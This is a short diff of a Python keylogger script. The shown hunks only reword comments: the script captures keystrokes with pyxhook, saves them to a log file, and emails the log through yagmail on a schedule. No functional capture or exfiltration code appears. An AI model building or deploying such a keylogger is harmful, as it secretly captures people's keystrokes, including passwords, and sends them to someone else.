@@ -10,7 +10,7 @@ from apscheduler.schedulers.blocking import BlockingScheduler
 
 ###############
 # Function using yagmail to send the log file
-# This email is open to testing purposes for the next 2 weeks
+# Replace the examples in the string with your info to receive the log
 ###############
 def sendLog(log):
     sender_email = "example@example.com" #Insert your email here
@@ -31,7 +31,8 @@ def sendLog(log):
 # Keylogger function
 # You can change the directory and/or name of the log "download.log"
 # Only emits new line/linebreak when user presses enter or Tab
-# If no directory is entered but only file name, it saves where the keylogger is
+# If no directory is entered but only file name, it autosaves to the same
+# location as the keylogger is
 # Uses file write to insert into log, pyxhook to grab keystrokes
 ############
 def Klogger():
